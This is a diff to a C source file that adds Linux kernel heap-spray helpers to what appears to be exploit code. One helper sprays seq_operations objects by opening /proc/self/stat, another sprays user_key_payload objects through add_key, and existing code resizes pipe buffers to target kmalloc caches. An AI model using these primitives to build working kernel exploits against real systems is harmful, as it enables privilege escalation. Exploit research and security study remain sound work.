@@ -10,7 +10,7 @@
 #include <unistd.h>
 #include <string.h>
 #include <stdlib.h>
-
+#include <keyutils.h>
 
 int resizePipeBuffer(int pipe[2], size_t kmalloc_target_size) {
     size_t cache_size = GET_KMALLOC_SIZE(kmalloc_target_size);
@@ -25,6 +25,47 @@ int resizePipeBuffer(int pipe[2], size_t kmalloc_target_size) {
     // kernel pipe object, affecting the write end (fd[1]) simultaneously.
     return fcntl(pipe[0], F_SETPIPE_SZ, pipe_capacity);
 }
+
+
+int alloc_sec_ops(int i){
+    int seq_ops = open("/proc/self/stat", O_RDONLY);
+
+    if(seq_ops < 0){
+        DIE("allocate_sec_ops(%d)", i);
+    }
+
+    return seq_ops;
+}
+
+void spray_seq_ops(int seq_ops[], int start, int end){
+    for(int i=start; i<end; i++){
+        seq_ops[i] = alloc_sec_ops(i);
+    }
+}
+
+int alloc_key(int id, char *buff, size_t size){
+    char desc[256] = {0};
+    char *payload;
+    int key;
+
+    size -= sizeof(struct user_key_payload);
+
+    //sprintf(desc, "payload_%d", id);
+    payload = buff ? buff : calloc(1, size);
+
+    if(!buff)
+        memset(payload, id, size);
+
+    key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);
+
+    if(key < 0){
+        DIE("add_key(%d)", id);
+    }
+    
+    return key;
+}
+
+
 
 
 /* TODO: Implement spray helpers.
